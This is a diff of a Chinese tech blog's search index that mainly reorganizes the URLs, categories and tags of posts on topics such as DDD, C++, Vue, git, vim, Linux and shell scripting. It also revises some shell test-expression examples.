 <h4 id="2-1-3-转置卷积（解码）后的输出"><a href="#2-1-3-转置卷积（解码）后的输出" class="headerlink" title="2.1.3. 转置卷积（解码）后的输出"></a>2.1.3. 转置卷积（解码）后的输出</h4><p>FCN 语义分割最后是对像素进行分类, 有多少类最后的输出图像就有多少个通道, 每个通道的像素值代表了这个通道的像素应划分到哪一个类别的概率, 如果某一个像素位置在第 3 通道的值最大, 那这个位置的像素就属于第 3 个分类。</p>
 ]]></content>
       <categories>
-        <category>计算机进阶</category>
+        <category>欲穷千里目，更上一层楼</category>
+        <category>人工智能</category>
       </categories>
       <tags>
         <tag>深度学习</tag>
+        <tag>语义分割</tag>
+        <tag>人工智能</tag>
       </tags>
   </entry>
   <entry>
     <title>浅谈领域驱动设计DDD</title>
-    <url>/application/%E6%B5%85%E8%B0%88%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1DDD.html</url>
+    <url>/%E6%B5%85%E8%B0%88%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1DDD.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习期间，组长布置的作业。</p>
 <a id="more"></a>
 <h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>2003年，<code>Eric Evans</code> 在 <code>《Domain-Driven Design: Tackling Complexity in the Heart of Software》</code> 一书中提出了 <strong>领域驱动设计（DDD）</strong> 的重要概念。</p>
@@ -6697,15 +6760,17 @@
 </ul>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>九层之台，起于累土</category>
+        <category>软件工程</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
+        <tag>软件工程</tag>
+        <tag>DDD</tag>
       </tags>
   </entry>
   <entry>
     <title>理解C++虚函数</title>
-    <url>/language/%E7%90%86%E8%A7%A3C++%E8%99%9A%E5%87%BD%E6%95%B0.html</url>
+    <url>/%E7%90%86%E8%A7%A3C++%E8%99%9A%E5%87%BD%E6%95%B0.html</url>
     <content><![CDATA[<h2 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1. 简单介绍"></a>1. 简单介绍</h2><p>C++虚函数是定义在基类中的函数，子类必须对其进行<a href="conceptUnderstand/C-重载与覆盖.html">覆盖</a>。在类中声明（无函数体的形式叫做声明）虚函数的格式如下：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
@@ -6748,7 +6813,8 @@
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Base1 *b_p = &amp;d1;     <span class="comment">// 指向子类对象的基类指针</span></span><br><span class="line">b_p-&gt;base1_fun1();    <span class="comment">// 调用子类虚函数</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>程序设计基础</category>
+        <category>九层之台，起于累土</category>
+        <category>程序设计语言</category>
       </categories>
       <tags>
         <tag>C/C++</tag>
@@ -6756,7 +6822,7 @@
   </entry>
   <entry>
     <title>用go实现聊天室(WebSocket方式)</title>
-    <url>/application/%E7%94%A8beego%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4-WebSocket%E6%96%B9%E5%BC%8F.html</url>
+    <url>/%E7%94%A8beego%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4-WebSocket%E6%96%B9%E5%BC%8F.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚入门<code>go</code>语言和<code>beego</code>框架，通过一个简单聊天室的实现，来趁热练习。</p>
 <p>详细代码见<a href="https://github.com/99MyCql/chatRoom" target="_blank" rel="noopener">github</a>。</p>
 <a id="more"></a>
@@ -6818,16 +6884,17 @@
 </ul>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
         <tag>Golang</tag>
+        <tag>后端</tag>
       </tags>
   </entry>
   <entry>
     <title>用python在gdb中实现一个简单服务器</title>
-    <url>/application/%E7%94%A8python%E5%9C%A8gdb%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
+    <url>/%E7%94%A8python%E5%9C%A8gdb%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%99%A8.html</url>
     <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p><code>gdb</code>是一个十分强大的调试器，而它又提供给<code>python</code>扩展的<code>gdb</code>模块。但是，该模块只有在<code>gdb</code>中，才能被成功导入。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br></pre></td></tr></table></figure>
 <p>运行上述代码，报错显示没有<code>gdb</code>模块。因为只有在<code>gdb</code>加载该<code>python</code>文件时，才能运行成功：</p>
@@ -6854,17 +6921,17 @@
 <h3 id="4-更多内容"><a href="#4-更多内容" class="headerlink" title="4. 更多内容"></a>4. 更多内容</h3><p>见<a href="https://github.com/gu-team/gdbServer" target="_blank" rel="noopener">https://github.com/gu-team/gdbServer</a></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>后端</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
-        <tag>计算机系统</tag>
         <tag>Python</tag>
+        <tag>后端</tag>
       </tags>
   </entry>
   <entry>
     <title>聊聊CI/CD与DevOps</title>
-    <url>/application/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps.html</url>
+    <url>/%E8%81%8A%E8%81%8ACI-CD%E4%B8%8EDevOps.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>实习期间，组长给每位实习生布置了一份作业——关于CI/CD，devops的个人理解和可行性。实话实说，我最喜欢带薪学习了。</p>
 <a id="more"></a>
 <h2 id="1-从瀑布模型谈起"><a href="#1-从瀑布模型谈起" class="headerlink" title="1. 从瀑布模型谈起"></a>1. 从瀑布模型谈起</h2><p>在谈起CI/CD、DevOps等之前，不得不提起软件工程开发模型的鼻祖——瀑布模型。</p>
@@ -6919,15 +6986,17 @@
 </ul>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>九层之台，起于累土</category>
+        <category>软件工程</category>
       </categories>
       <tags>
-        <tag>Backend</tag>
+        <tag>后端</tag>
+        <tag>DevOps</tag>
       </tags>
   </entry>
   <entry>
     <title>简单入门 MIPS</title>
-    <url>/cs/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS.html</url>
+    <url>/%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8-MIPS.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>long long ago，接到一个 x86-64 转 MIPS64 的项目，最近开始。</p>
 <p>先简单学习一下 MIPS32 。</p>
 <p>参考：<a href="https://www.bilibili.com/video/BV11t411K7Up?t=528&amp;p=46" target="_blank" rel="noopener">bilibili - 计算机组成原理（MIPS汇编语言） 袁春风 | 南京大学</a></p>
@@ -7022,15 +7091,17 @@
 <p><img src="简单入门-MIPS/30.png" alt="pic"></p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机系统</category>
       </categories>
       <tags>
         <tag>计算机系统</tag>
+        <tag>MIPS</tag>
       </tags>
   </entry>
   <entry>
     <title>谈谈vue与jQuery</title>
-    <url>/application/%E8%B0%88%E8%B0%88vue%E4%B8%8EjQuery.html</url>
+    <url>/%E8%B0%88%E8%B0%88vue%E4%B8%8EjQuery.html</url>
     <content><![CDATA[<h2 id="无题"><a href="#无题" class="headerlink" title="无题"></a>无题</h2><p>虽然十分不想搭理前端，也不想过多去接触开发，但无奈接了多个前端的锅，也确实花费了我大量的时间在前端开发上(摊手)。总而言之，我的前端开发能力，虽然依旧菜得抠脚，但也有一些小小的感悟。</p>
 <p>我曾想用<code>vue</code>+<code>bootstrap</code>搭建一个前端项目，但在此过程中，却遇到了一个问题：<br>在<code>bootstrap</code>中，要实现对其中一些<strong>组件</strong>的操作，官网的示例都是使用<code>jQuery</code>进行的，<code>bootstrap</code>本身也是与<code>jQuery</code>紧密结合的。而我却是采用<code>vue</code>————一个不擅于操作DOM(文档对象模型 Document Object Model)元素的框架。</p>
 <a id="more"></a>
@@ -7051,16 +7122,17 @@
 <p>不过，后端真香。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
-        <tag>Javascript</tag>
+        <tag>前端</tag>
+        <tag>Vue</tag>
       </tags>
   </entry>
   <entry>
     <title>递归与非递归的转换（树的非递归遍历）</title>
-    <url>/cs/%E9%80%92%E5%BD%92%E4%B8%8E%E9%9D%9E%E9%80%92%E5%BD%92%E7%9A%84%E8%BD%AC%E6%8D%A2.html</url>
+    <url>/%E9%80%92%E5%BD%92%E4%B8%8E%E9%9D%9E%E9%80%92%E5%BD%92%E7%9A%84%E8%BD%AC%E6%8D%A2.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>递归是计算机中基本而实用的算法思想。</p>
 <p>主要用于解决<strong>有边界的重复性操作</strong>问题，即满足<strong>数学归纳法</strong>特性的问题。比如斐波那契数列。</p>
 <p>可递归却有不少缺陷：运行效率低下、递归过多容易栈溢出等等。</p>
@@ -7104,15 +7176,16 @@
 <h2 id="3-后话"><a href="#3-后话" class="headerlink" title="3. 后话"></a>3. 后话</h2><p>实际上，递归并非我们想象中那么拖慢效率。在不至于递归栈爆的情况下，我们还是可以放心地使用递归的。</p>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>九层之台，起于累土</category>
+        <category>数据结构与算法</category>
       </categories>
       <tags>
-        <tag>算法</tag>
+        <tag>数据结构与算法</tag>
       </tags>
   </entry>
   <entry>
     <title>通过highlight.js在vue中实现代码高亮</title>
-    <url>/application/%E9%80%9A%E8%BF%87highlight%E5%9C%A8vue%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE.html</url>
+    <url>/%E9%80%9A%E8%BF%87highlight%E5%9C%A8vue%E4%B8%AD%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>在 <code>vue-cli3</code> 项目中，通过<code>highlight.js</code>，实现页面中代码高亮。</p>
 <p>请先了解<a href="https://highlightjs.org/" target="_blank" rel="noopener">highlight.js官网</a>中的使用说明。</p>
 <a id="more"></a>
@@ -7129,16 +7202,17 @@
 <p>更换更多的代码高亮风格，需要切换<code>highlight.js</code>中导入的<code>css</code>文件。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
-        <tag>Javascript</tag>
+        <tag>前端</tag>
+        <tag>Vue</tag>
       </tags>
   </entry>
   <entry>
     <title>vim学习笔记</title>
-    <url>/application/vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一篇学习笔记，用于知识备忘。</p>
 <a id="more"></a>
 <h3 id="一、vim介绍"><a href="#一、vim介绍" class="headerlink" title="一、vim介绍"></a>一、vim介绍</h3><p>1.vim是Linux下的一个文本编辑工具，即用于在控制台中编辑文本。通过命名<code>vim xxx</code>即可进入该文本的vim操作界面，也可以用比如：<code>vim test.c</code>的命令来新建一个test.c文件。</p>
@@ -7210,15 +7284,16 @@
 <p>以上是笔者自己的简单配置，若要花里胡哨一点的，可以百度vim配置文件，一堆，直接复制到自己的这个配置文件中即可。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
-        <tag>计算机系统</tag>
+        <tag>Linux</tag>
+        <tag>Vim</tag>
       </tags>
   </entry>
   <entry>
     <title>STL学习笔记</title>
-    <url>/cs/STL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/STL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>STL是C++中的一个类库，提供常用的数据结构(如栈、队列等)和算法(如排序、查找等)。</p>
 <p>灵活运用STL中的数据结构，可以帮助你有效解决很多算法问题。</p>
 <p>简单记载STL中的常用内容。</p>
@@ -7488,16 +7563,16 @@
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C++ 中 struct Arc 就相当于定义了结构体类型 Arc</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arc</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> from, to;</span><br><span class="line">  <span class="keyword">int</span> weight;</span><br><span class="line">  <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Arc &amp;b) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;weight &lt; b.weight;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Arc arcs[<span class="number">100005</span>];</span><br><span class="line">sort(arcs, arcs+m);</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>计算机基础</category>
+        <category>不知道怎么分类的分类</category>
       </categories>
       <tags>
         <tag>C/C++</tag>
-        <tag>算法</tag>
+        <tag>STL</tag>
       </tags>
   </entry>
   <entry>
     <title>linux命令学习笔记</title>
-    <url>/application/linux%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/linux%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>一篇关于linux简单命令的学习笔记。</p>
 <p>在linux的<code>/bin/</code>目录下包含一些基础命令的可执行文件(二进制文件)。</p>
@@ -7887,15 +7962,17 @@
 <h3 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h3><p>显示当前用户的用户名</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>九层之台，起于累土</category>
+        <category>计算机系统</category>
       </categories>
       <tags>
         <tag>计算机系统</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
     <title>git学习笔记</title>
-    <url>/application/git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>git在团队协作中有重要作用，是有必要进行系统学习的一门工具。本篇是笔者学习git操作的备忘笔记，主要在linux上进行。</p>
 <h2 id="1-git历史"><a href="#1-git历史" class="headerlink" title="1. git历史"></a>1. git历史</h2><blockquote>
 <p>很多人都知道，Linus在1991年创建了开源的Linux，从此，Linux系统不断发展，已经成为最大的服务器系统软件了。<br>Linus虽然创建了Linux，但Linux的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为Linux编写代码，那Linux的代码是如何管理的呢？<br>事实是，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！<br>你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。<br>不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。<br>安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。<br>Linus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：<br>Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。<br>Git迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。<br>历史就是这么偶然，如果不是当年BitMover公司威胁Linux社区，可能现在我们就没有免费而超级好用的Git了。</p>
@@ -8061,7 +8138,7 @@
 <h2 id="7-参考教程："><a href="#7-参考教程：" class="headerlink" title="7. 参考教程："></a>7. 参考教程：</h2><p><a href="https://git-scm.com/docs" target="_blank" rel="noopener">git官网</a><br><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener">廖雪峰git教程</a><br><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html" target="_blank" rel="noopener">阮一峰的网络日志</a></p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>应用与不知道怎么分类的分类开发</category>
       </categories>
       <tags>
         <tag>Git</tag>
@@ -8069,7 +8146,7 @@
   </entry>
   <entry>
     <title>vueJs入门</title>
-    <url>/application/vueJs%E5%85%A5%E9%97%A8.html</url>
+    <url>/vueJs%E5%85%A5%E9%97%A8.html</url>
     <content><![CDATA[<h2 id="1、下载node-js，再安装npm和vue"><a href="#1、下载node-js，再安装npm和vue" class="headerlink" title="1、下载node.js，再安装npm和vue"></a>1、下载node.js，再安装npm和vue</h2><p>（1）到node.js官网下载node.js。下载并安装成功后，在控制台输入：<code>node -v</code> ，查看node是否安装成功；输入：<code>npm -v</code> ，查看node自带的npm是否安装成功。</p>
 <p>（2）安装cnpm（中国版npm），控制台输入：<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>。</p>
 <p>（3）安装vue和vue-cli，控制台分别输入：<code>cnpm install -g vue</code> 和 <code>cnpm install -g vue-cli</code> 。（由于新版的vue-cli已经集成了webpack 所以下载了这个脚手架之后就不需要在下载webpack了）</p>
@@ -8142,16 +8219,17 @@
 <h2 id="4-后话"><a href="#4-后话" class="headerlink" title="4. 后话"></a>4. 后话</h2><p>此篇笔记是刚刚接触<code>vuejs</code>时所写，较急促，不完整。期望以后更深入的学习和更完善的笔记。</p>
 ]]></content>
       <categories>
-        <category>应用与开发</category>
+        <category>不想开滴滴的外卖骑手不是好码农</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>Frontend</tag>
-        <tag>Javascript</tag>
+        <tag>前端</tag>
+        <tag>Vue</tag>
       </tags>
   </entry>
   <entry>
     <title>shell学习笔记</title>
-    <url>/language/shell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
+    <url>/shell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
     <content><![CDATA[<p>[TOC]</p>
 <h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>鉴于实习中经常使用 shell 语言，因此趁此机会好好学习一下“强大”的 shell 语言。</p>
 <a id="more"></a>
@@ -8332,48 +8410,52 @@
 <p><code>if</code> 后面所接的判断条件是一个命令，命令返回成功（0）则为真，返回失败（非0）则为假。</p>
 <h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p><code>if</code> 判断条件通常使用 <code>test</code> 命令，它是一个用于判断的命令，它有三种形式：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写法一</span></span><br><span class="line"><span class="built_in">test</span> expr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写法二</span></span><br><span class="line">[ expr ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写法三</span></span><br><span class="line">[[ expr ]]</span><br></pre></td></tr></table></figure>
-<p><strong>注意</strong>：中括号 <code>[ ]</code> 与表达式之间必须包含空格</p>
+<p><strong>注意</strong>：</p>
+<ul>
+<li>中括号 <code>[ ]</code> 与表达式之间必须包含空格</li>
+<li>第二种形式与第三种形式，在某些场景（比如逻辑判断）有所不同，详情参考：[bash中 [ ] 与 <a href="https://www.zsythink.net/archives/2252" target="_blank" rel="noopener">[ ]] 的区别</a></li>
+</ul>
 <p>由于 <code>test</code> 是一个命令，它支持很多选项：</p>
 <h4 id="1-文件判断"><a href="#1-文件判断" class="headerlink" title="1) 文件判断"></a>1) 文件判断</h4><ul>
-<li><code>[ -a file ]</code>：如果 file 存在，则为true。</li>
-<li><code>[ -b file ]</code>：如果 file 存在并且是一个块（设备）文件，则为true。</li>
-<li><code>[ -c file ]</code>：如果 file 存在并且是一个字符（设备）文件，则为true。</li>
-<li><code>[ -d file ]</code>：如果 file 存在并且是一个目录，则为true。</li>
-<li><code>[ -e file ]</code>：如果 file 存在，则为true。</li>
-<li><code>[ -f file ]</code>：如果 file 存在并且是一个普通文件，则为true。</li>
+<li><code>[ -a $file ]</code>：如果 file 存在，则为true。</li>
+<li><code>[ -b $file ]</code>：如果 file 存在并且是一个块（设备）文件，则为true。</li>
+<li><code>[ -c $file ]</code>：如果 file 存在并且是一个字符（设备）文件，则为true。</li>
+<li><code>[ -d $file ]</code>：如果 file 存在并且是一个目录，则为true。</li>
+<li><code>[ -e $file ]</code>：如果 file 存在，则为true。</li>
+<li><code>[ -f $file ]</code>：如果 file 存在并且是一个普通文件，则为true。</li>
 </ul>
 <p>更多见：<a href="https://wangdoc.com/bash/condition.html#%E6%96%87%E4%BB%B6%E5%88%A4%E6%96%AD" target="_blank" rel="noopener">条件判断</a></p>
 <h4 id="2-字符串判断"><a href="#2-字符串判断" class="headerlink" title="2) 字符串判断"></a>2) 字符串判断</h4><ul>
-<li><code>[ str ]</code>：如果str不为空（长度大于0），则判断为真。</li>
-<li><code>[ -n str ]</code>：如果字符串str的长度大于零，则判断为真。</li>
-<li><code>[ -z str ]</code>：如果字符串str的长度为零，则判断为真。</li>
-<li><code>[ str1 = str2 ]</code>：如果str1和str2相同，则判断为真。</li>
-<li><code>[ str1 == str2 ]</code>：等同于[ str1 = str2 ]。</li>
-<li><code>[ str1 != str2 ]</code>：如果str1和str2不相同，则判断为真。</li>
-<li><code>[ str1 &#39;&gt;&#39; str2 ]</code>：如果按照字典顺序str1排列在str2之后，则判断为真。</li>
-<li><code>[ str1 &#39;&lt;&#39; str2 ]</code>：如果按照字典顺序str1排列在str2之前，则判断为真。</li>
+<li><code>[ $str ]</code>：如果str不为空（长度大于0），则判断为真。</li>
+<li><code>[ -n $str ]</code>：如果字符串str的长度大于零，则判断为真。</li>
+<li><code>[ -z $str ]</code>：如果字符串str的长度为零，则判断为真。</li>
+<li><code>[ $str1 = $str2 ]</code>：如果str1和str2相同，则判断为真。</li>
+<li><code>[ $str1 == $str2 ]</code>：等同于[ $str1 = $str2 ]。</li>
+<li><code>[ $str1 != $str2 ]</code>：如果str1和str2不相同，则判断为真。</li>
+<li><code>[ $str1 &#39;&gt;&#39; $str2 ]</code>：如果按照字典顺序str1排列在str2之后，则判断为真。</li>
+<li><code>[ $str1 &#39;&lt;&#39; $str2 ]</code>：如果按照字典顺序str1排列在str2之前，则判断为真。</li>
 </ul>
 <p><strong>注意</strong>：test命令内部的<code>&gt;</code>和<code>&lt;</code>，必须用引号括起来（或者是用反斜杠转义），否则它们会被 shell 解释为重定向操作符。</p>
 <h4 id="3-整数判断"><a href="#3-整数判断" class="headerlink" title="3) 整数判断"></a>3) 整数判断</h4><p>由于 <code>&gt;</code> <code>&lt;</code> 会被误解为重定向操作法，所以有专门的整数判断指令。</p>
 <ul>
-<li><code>[ int1 -eq int2 ]</code>：如果int1等于int2，则为true。</li>
-<li><code>[ int1 -ne int2 ]</code>：如果int1不等于int2，则为true。</li>
-<li><code>[ int1 -le int2 ]</code>：如果int1小于或等于int2，则为true。</li>
-<li><code>[ int1 -lt int2 ]</code>：如果int1小于int2，则为true。</li>
-<li><code>[ int1 -ge int2 ]</code>：如果int1大于或等于int2，则为true。</li>
-<li><code>[ int1 -gt int2 ]</code>：如果int1大于int2，则为true。</li>
+<li><code>[ $int1 -eq $int2 ]</code>：如果int1等于int2，则为true。</li>
+<li><code>[ $int1 -ne $int2 ]</code>：如果int1不等于int2，则为true。</li>
+<li><code>[ $int1 -le $int2 ]</code>：如果int1小于或等于int2，则为true。</li>
+<li><code>[ $int1 -lt $int2 ]</code>：如果int1小于int2，则为true。</li>
+<li><code>[ $int1 -ge $int2 ]</code>：如果int1大于或等于int2，则为true。</li>
+<li><code>[ $int1 -gt $int2 ]</code>：如果int1大于int2，则为true。</li>
 </ul>
 <h4 id="4-逻辑判断"><a href="#4-逻辑判断" class="headerlink" title="4) 逻辑判断"></a>4) 逻辑判断</h4><ul>
-<li><code>[ expr1 &amp;&amp; expr1 ]</code></li>
-<li><code>[ expr1 || expr1 ]</code></li>
-<li><code>[ ! expr1 ]</code>/<code>[ ! \( expr1 &amp;&amp; expr2 \) ]</code></li>
+<li><code>[[ $expr1 &amp;&amp; $expr1 ]]</code> / <code>[ $expr1 ] &amp;&amp; [ $expr1 ]</code></li>
+<li><code>[[ $expr1 || $expr1 ]]</code> / <code>[ $expr1 ] || [ $expr1 ]</code></li>
+<li><code>[ ! $expr1 ]</code> / <code>[ ! \( $expr1 &amp;&amp; $expr2 \) ]</code></li>
 </ul>
 <p><strong>注意</strong>：test命令内部使用<code>(</code>和<code>)</code>必须使用引号或转义。</p>
 <h3 id="运算表达式"><a href="#运算表达式" class="headerlink" title="运算表达式"></a>运算表达式</h3><p><code>if</code> 判断条件也可以使用运算表达式 <code>(( ))</code>。</p>
 <p>但注意：<strong>运算表达式返回非0 <code>((1))</code> 表示真，返回0 <code>((0))</code> 表示假</strong>。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $((2 &gt; 1)) <span class="comment"># 1</span></span><br><span class="line"><span class="keyword">if</span> ((2&gt;1)); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="literal">true</span> <span class="comment"># true</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
 <h3 id="普通命令"><a href="#普通命令" class="headerlink" title="普通命令"></a>普通命令</h3><p><code>if</code> 判断条件可以直接使用命令，命令返回成功（0）则为真，返回失败（非0）则为假。</p>
-<p>当然，也可以使用管道、重定向、命令结束符<code>;</code>、命令组合符等。</p>
+<p>当然，也可以使用管道、重定向、命令结束符<code>;</code>、命令组合符<code>&amp;&amp;</code> <code>||</code>等。</p>
 <p>比如：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> mkdir temp &amp;&amp; <span class="built_in">cd</span> temp; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"enter in temp/"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
 <h2 id="8-case"><a href="#8-case" class="headerlink" title="8. case"></a>8. case</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> expression <span class="keyword">in</span></span><br><span class="line">  pattern )</span><br><span class="line">    commands ;;</span><br><span class="line">  pattern )</span><br><span class="line">    commands ;;</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure>
@@ -8383,7 +8465,7 @@
 <p>判断条件与 <code>if</code> 一样。</p>
 <h3 id="until"><a href="#until" class="headerlink" title="until"></a>until</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">until commands; <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 <h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>遍历列表每一项：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> variable <span class="keyword">in</span> list; <span class="keyword">do</span></span><br><span class="line">  commands</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
